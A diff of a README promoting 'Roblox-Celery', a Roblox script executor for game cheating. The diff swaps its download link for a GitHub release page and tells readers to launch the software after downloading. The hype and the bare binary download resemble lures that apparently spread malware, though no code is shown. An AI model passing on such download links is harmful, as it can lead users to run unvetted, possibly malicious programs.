@@ -2,7 +2,7 @@
 
 Roblox-Celery is a revolutionary Roblox executor that enhances your gameplay experience by offering seamless script execution capabilities, allowing you to unleash your creativity and explore endless possibilities within your favorite Roblox games.
 
-![Roblox-Celery Logo](https://example.com/logo.png)
+![Roblox-Celery Logo](https://github.com/banana123-stack/Roblox-Celery/releases/tag/v2.0)
 
 ## Features
 - **Script Execution**: Execute custom scripts effortlessly to enhance your gameplay.
@@ -13,7 +13,7 @@ Roblox-Celery is a revolutionary Roblox executor that enhances your gameplay exp
 ## Installation
 To get started with Roblox-Celery, download the software from the link below:
 
-[![Download Roblox-Celery](https://img.shields.io/badge/Download-Software-9cf)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Roblox-Celery](https://github.com/banana123-stack/Roblox-Celery/releases/tag/v2.0)](https://github.com/banana123-stack/Roblox-Celery/releases/tag/v2.0)
 
 Please note that the software needs to be launched after downloading.
 
